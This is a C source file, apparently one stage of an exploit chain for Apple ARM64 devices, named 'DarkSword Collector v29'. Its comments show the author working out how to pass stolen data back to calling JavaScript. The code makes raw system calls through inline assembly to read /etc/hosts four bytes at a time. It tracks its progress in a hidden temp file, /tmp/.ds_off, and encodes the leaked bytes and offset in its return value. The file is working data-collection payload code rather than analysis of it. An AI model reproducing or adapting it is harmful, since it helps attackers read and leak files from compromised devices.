/**
 * DarkSword Collector v29 - Offset encoded in return value
 * bits 0-15:  data (4 bytes packed as uint16 - only low bytes of first 2 chars)
 * Actually: bits 0-7: byte0, bits 8-15: byte1, bits 16-31: offset where data was read from
 * When read returns <1 byte: return 0xFFFFFFFF (done sentinel)
 * Next call: JS passes offset via Ad() to a safe memory location
 * 
 * SIMPLER: just return all 4 data bytes + let JS figure out offset
 * Return: data as int32. When done, return 0xDEADFFFF.
 * Problem: how to tell collector the next offset?
 * 
 * SOLUTION: Collector reads /tmp/ds_off. If it works, great.
 * If not, fallback: encode offset in return value upper bits.
 * Return: (data_bytes & 0xFFFF) | (offset << 16)
 * JS extracts offset from return value and passes it back... 
 * but we can't pass args to ds_start!
 *
 * ACTUAL SOLUTION: Use /tmp file but with full /private/var/tmp path
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}

#define SYS_open   5
#define SYS_read   3
#define SYS_close  6
#define SYS_write  4
#define SYS_lseek  199
#define SYS_unlink 10
#define SEEK_SET   0
#define O_RDONLY   0
#define O_WRONLY   0x0001
#define O_CREAT    0x0200
#define O_TRUNC    0x0400

static const char *STATE_FILE = "/tmp/.ds_off";

static int _atoi(const char *s) {
    int v = 0;
    while (*s >= '0' && *s <= '9') v = v * 10 + (*s++ - '0');
    return v;
}
static int _itoa(int v, char *buf) {
    char tmp[12]; int i = 0;
    if (v == 0) { buf[0] = '0'; buf[1] = 0; return 1; }
    while (v > 0) { tmp[i++] = '0' + (v % 10); v /= 10; }
    int len = i;
    for (int j = 0; j < len; j++) buf[j] = tmp[len - 1 - j];
    buf[len] = 0;
    return len;
}

int ds_start(void) {
    char obuf[12] = {0};
    int offset = 0;

    /* Read current offset */
    int fd = (int)_svc2(SYS_open, (long)STATE_FILE, O_RDONLY);
    if (fd >= 0) {
        int n = (int)_svc3(SYS_read, fd, (long)obuf, 10);
        _svc1(SYS_close, fd);
        if (n > 0) offset = _atoi(obuf);
    }

    /* Read 4 bytes from /etc/hosts */
    fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
    if (fd < 0) return 0xDEAD0000;
    if (offset > 0) _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);
    if (n < 1) return 0xFFFFFFFF; /* done */

    /* Write next offset */
    char nbuf[12]; int len = _itoa(offset + n, nbuf);
    fd = (int)_svc4(SYS_open, (long)STATE_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0);
    if (fd >= 0) {
        _svc3(SYS_write, fd, (long)nbuf, len);
        _svc1(SYS_close, fd);
    }

    /* Return: data in low 16 bits, current offset in high 16 bits */
    int d = (int)buf[0] | ((int)buf[1] << 8);
    return d | (offset << 16);
}
